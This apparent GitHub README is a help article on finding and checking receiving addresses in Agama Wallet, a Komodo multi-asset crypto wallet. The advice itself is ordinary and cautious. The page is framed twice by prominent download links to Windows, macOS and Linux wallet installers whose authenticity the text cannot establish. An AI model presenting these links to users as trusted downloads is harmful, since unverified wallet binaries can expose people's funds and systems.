[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Finding Your Receiving Address in Agama Wallet

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

The receiving address is shown on the wallet's Receive screen for the selected asset, and it is the string you give to whoever is sending you funds. Each asset has its own format, and a UTXO wallet may show a fresh address for each receipt. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and Receive, Send, seed phrase and password are its own interface labels.

## You'll see this if

You are about to be paid, and the wallet shows an address you have never seen before, or several addresses, and none of them is obviously the right one.

| What you see | What it means |
|---|---|
| A new address each time you open Receive | Normal on a UTXO wallet; all of them are yours |
| An address with a different prefix per asset | Each chain has its own format |
| A QR code and a text string | The same address in two forms |
| An address you do not recognise in history | Usually change from your own spend |
| A "copy" button and a warning about the chain | The wallet is telling you which network to use |

## Why it happens

Addresses are derived from the wallet's keys, not stored as a fixed identifier. A UTXO wallet derives a sequence of them, and showing a fresh one for each receipt is a privacy choice: it makes it harder to link payments to one another by address alone.

That design produces two questions users ask. First, whether an old address still works: it does, because it was derived from the same keys and remains spendable. Second, why history shows addresses never handed out: because change returns to a newly derived address rather than the one that funded the payment.

Each asset compounds this. A KMD address, a BTC address and an ERC-20 deposit address are different formats on different chains, and sending to the wrong one is not reversible.

## Fix

Getting paid correctly is three checks and one habit.

1. **Select the asset first.** The Receive screen shows an address for the selected asset, and the wrong selection produces a valid-looking address for the wrong chain.
2. **Match the format to the sender's chain.** If the sender expects a specific network, confirm that the address's prefix matches it.
3. **Copy the address, do not retype it.** Transcription errors are the most common cause of lost funds, and checksum protection only catches some of them.
4. **Send a small test first for a large payment.** It confirms the address works before the bulk moves.
5. **Record the address you gave out.** It is the cheapest way to check a restore later, as [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) explains.

If the sender asks for a memo, tag or payment ID, that is a chain-specific requirement and not an Agama feature; follow the sender's instructions for their chain.

## If that did not work

If funds sent to a shown address never appear, check the transaction on the chain's explorer before assuming a wallet fault. If it confirmed, the address exists and the wallet has not scanned it.

If the address looks wrong for the asset, stop the sender before they broadcast. Address formats differ, and a mismatch is not recoverable by the wallet.

If a payment arrived at an address the wallet does not show, that address is outside the scanned range. [Why a seed phrase fails](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) covers why ranges and derivation matter.

If a page or a person offers to "verify" the address by asking for a phrase or a key, it is not a verification. Never share or type recovery material to confirm an address, because the address is public and the phrase is the wallet.

## Prevention

- **Keep a written list of addresses you handed out.** It turns later confusion into a lookup.
- **Test with a small amount.** Especially for a first payment from a new sender.
- **Check the chain, not just the string.** A valid address on the wrong network is still wrong.
- **Expect new addresses.** A UTXO wallet rotating them is working as designed.
- **Do not reuse one address everywhere.** [What a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md) explains why the wallet rotates them.

## FAQ

### Does an old receiving address still work?

Yes, if it was derived from the same keys. Addresses do not expire; the wallet keeps deriving from the same phrase.

### Why does the address change every time?

Because a UTXO wallet derives a new address for each receipt to reduce linkability. All of them belong to the same wallet.

### Can I receive on a chain the wallet does not list?

No. The wallet can only show addresses for chains it implements, and sending an unsupported asset to a listed address will not credit it.

### Can two different assets share an address?

No. Each chain defines its own address format, and a string valid on one chain is meaningless on another. That is why the asset selector on the Receive screen matters more than the copy button.

### Why does the QR code differ from the text?

It should not: the code encodes the same address. If a scanner shows a different string, the code belongs to another asset or another request, and the text is the value to compare.

### Does the sender need anything besides the address?

Only what their chain requires, which is sometimes a memo or tag. The wallet itself asks for nothing, so a request for extra information beyond an address and an amount is worth questioning.

### What if I sent to the wrong address format?

The transaction is valid on the chain it was broadcast to, so recovery depends on whether that address is spendable by anyone. Prevention is the only reliable control.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Which Assets Agama Wallet Supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md)
- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
